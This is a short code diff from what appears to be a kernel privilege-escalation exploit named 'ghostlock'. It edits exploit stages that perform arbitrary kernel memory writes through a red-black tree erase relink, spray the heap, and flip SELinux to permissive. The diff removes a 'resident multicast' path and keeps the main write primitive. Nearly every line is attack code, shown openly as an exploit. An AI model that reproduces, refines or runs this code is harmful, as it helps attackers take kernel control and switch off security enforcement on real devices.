@@ -346,7 +346,6 @@ namespace ghostlock::session::backend {
             if constexpr (!M::multicast) {
                 return true;
             } else {
-                if (session.profile.multicast_resident()) return true;
                 const profile::MulticastWaiterLayout mcast = session.profile.multicast_layout();
                 const uintptr_t w1_scratch_poison =
                         (session.heap.current.base) + mcast.buffer_size;
@@ -393,7 +392,7 @@ namespace ghostlock::session::backend {
                 uint32_t w1_attempts = g_exploit_session.profile.w1_attempts();
                 if constexpr (M::multicast) {
                     /* a non-resident multicast write cannot safely retry a missed W1 */
-                    if (!session.profile.multicast_resident()) w1_attempts = 1;
+                    w1_attempts = 1;
                 }
                 support::run_state::enter("w1a");
                 selinux_ok = retry_write_stage<M>(
@@ -406,22 +405,17 @@ namespace ghostlock::session::backend {
 
                 if (!selinux_ok) {
                     pr_warning("Write 1 failed\n");
-                    route::kernel5_resident_stop();
                     return StageResult::Failed;
                 }
                 support::run_state::complete("w1a");
                 support::run_state::enter("w1b");
                 if (!w1_scratch_repair<M>(session)) return StageResult::Failed;
                 support::run_state::complete("w1b");
-                support::run_state::enter("w1c");
-                if (!M::w1_resident_repair(session)) return StageResult::Failed;
-                support::run_state::complete("w1c");
                 attack::timer_mark("Write 1 complete");
             } else {
                 pr_success("SELinux already permissive\n");
                 support::run_state::complete("w1a");
                 support::run_state::complete("w1b");
-                support::run_state::complete("w1c");
             }
             return StageResult::Continue;
         }
@@ -486,10 +480,6 @@ namespace ghostlock::session::backend {
         /* Both transports write *(target) := value through the erase left-only
          * relink: waiter words are {pc = value, right = 0, left = target} and
          * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
-        if (const std::optional<Status> handled = M::resident_write(session, request)) {
-            return *handled;
-        }
-
         attack::timer_mark("  heap spray start");
         (session.heap.current.base) = support::prepare_good_kernel_page(request);
         if (!(session.heap.current.base)) {
